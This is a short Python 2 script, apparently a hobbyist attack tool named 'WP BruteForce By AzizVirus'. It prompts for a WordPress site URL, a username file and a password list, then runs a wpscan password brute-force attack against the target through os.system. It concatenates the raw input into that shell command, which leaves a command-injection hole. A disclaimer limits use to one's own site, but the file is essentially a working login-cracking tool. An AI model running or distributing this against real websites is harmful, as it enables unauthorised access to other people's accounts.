# -*- coding: utf-8 -*-
#!/usr/bin/python
import os
import sys
import time

#Defining colors
class bcolors:
	HEADER = '\033[95m' #move
	BLUE = '\033[94m' #blue
	GREEN = '\033[92m' #green
	WARNING = '\033[93m' #orange                                  
	RED = '\033[91m' #red
	ENDC = '\033[0m' #end color
	BOLD = '\033[1m' #gras
	UNDERLINE = '\033[4m' #underline
        BLEUCIEL = '\033[1;36m' #bleuciel

prompt = bcolors.RED + 'WordPress Cracker@: ' + bcolors.ENDC + ' '
start_time = time.time()
tick = bcolors.GREEN + '✔' + bcolors.ENDC + ' '
untick = bcolors.RED + '✘' + bcolors.ENDC + ' '
os.system("clear")
os.system("figlet WP BruteForce By AzizVirus")
print ' '
print bcolors.GREEN + 'Tool Made By AzizVirus... Do Not Use For Illegal Purposes ! '
print bcolors.GREEN + 'Please Use This Tool Only To Pentest Your Website And You Are Responsible On Your Illegal Actions !'
print bcolors.GREEN + 'This Tool Use WPscan Tool ' + bcolors.ENDC + ' '
print ' '
target = raw_input(prompt + "Enter The Target (WordPress Website Link) ==> ")
print ' '
print (prompt + "Target Selected !  ==> " + target )
print ' '
userfile = raw_input(prompt + "Enter The Username File ==> ")
print ' '
print (prompt + "UserName File Selected ! ==> " + userfile)
print ' '
passwfile = raw_input(prompt + "Enter The PasswordList File Name  ==> ")
print ' '
print (prompt + "Password File Selected ! ==> " + passwfile)
print ' '
print prompt + "Attack Started ! "
print ' '
os.system("wpscan --url "+target+" --passwords "+passwfile+" --usernames "+userfile)
print ' '
print prompt + "Time elapsed: " + str(time.time() - start_time)
print ' '
